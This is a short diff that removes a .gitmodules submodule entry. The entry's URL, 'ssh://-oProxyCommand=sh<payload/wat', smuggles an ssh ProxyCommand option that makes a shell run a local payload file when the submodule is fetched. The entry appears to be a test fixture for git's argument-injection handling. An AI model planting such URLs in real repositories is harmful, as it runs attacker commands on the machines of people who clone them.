@@ -1,3 +1,0 @@
-[submodule "git"]
-	path = git
-	url = ssh://-oProxyCommand=sh<payload/wat 
